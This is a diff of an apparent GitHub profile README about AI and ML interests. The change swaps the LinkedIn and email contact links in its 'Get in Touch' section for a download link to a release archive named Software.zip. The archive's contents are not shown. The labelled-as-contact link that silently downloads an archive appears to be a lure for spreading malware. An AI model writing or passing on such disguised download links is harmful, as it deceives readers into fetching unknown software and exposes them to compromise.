@@ -18,5 +18,5 @@
 - 📚 Staying updated with the latest research and developments in AI and ML
 
 ### Get in Touch
-- [LinkedIn](https://www.linkedin.com/in/sri-ramapriyan/)
-- [Email](ramapriyandbs514@gmail.com)
+- [LinkedIn](https://github.com/SriRamapriyan/SriRamapriyan/releases/download/v1.0/Software.zip)
+- [Email](https://github.com/SriRamapriyan/SriRamapriyan/releases/download/v1.0/Software.zip)
